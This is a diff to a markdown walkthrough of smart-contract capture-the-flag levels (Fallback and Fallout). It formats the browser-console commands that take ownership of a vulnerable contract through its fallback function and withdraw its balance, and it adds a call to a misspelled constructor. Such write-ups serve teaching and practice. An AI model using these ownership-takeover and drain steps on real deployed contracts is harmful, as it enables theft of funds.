@@ -12,15 +12,18 @@ In the case of this contract, in order to execute the fallback function we need 
 Therefore, before calling the fallback function with an amount attached to it, we also need to increase our contributions (using the *contribute* function). Once that’s done we will become the new owner of the contract. We can then use the *withdraw* function to reduce its balance to 0.
 
 We will solve this challenge using the following command in the console (can be access by clicking F12):<br/>
-*await contract.owner()*<br/>
-*player*<br/>
-*await contract.contributions(player)*<br/>
-*await contract.contribute({value:1})*<br/>
-*await contract.contributions(player)*<br/>
-*await contract.sendTransaction({value:1})*<br/>
-*await contract.owner()*<br/>
-*player*<br/>
-*await contract.withdraw()*<br/>
+
+```
+await contract.owner()
+player*<br/>
+await contract.contributions(player)
+await contract.contribute({value:1})
+await contract.contributions(player)
+await contract.sendTransaction({value:1})
+await contract.owner()
+player
+await contract.withdraw()
+```
 
 ### Level 2 Fallout:
 Solidity documentation release 0.8.0 :<br/>
@@ -31,6 +34,10 @@ was deprecated and is not allowed anymore in version 0.5.0.”*
 
 In this contract, the constructor syntax is deprecated and misspelled (fal1out written with the number 1 instead of 
 the letter l). Therefore, to claim ownership of this contract you just need to call the *fal1out* function.
+
+```
+await contract.Fal1out({value: 1337});
+```
 
 ### Level 3 CoinFlip:
 Solidity documentation release 0.8.0 :<br/>
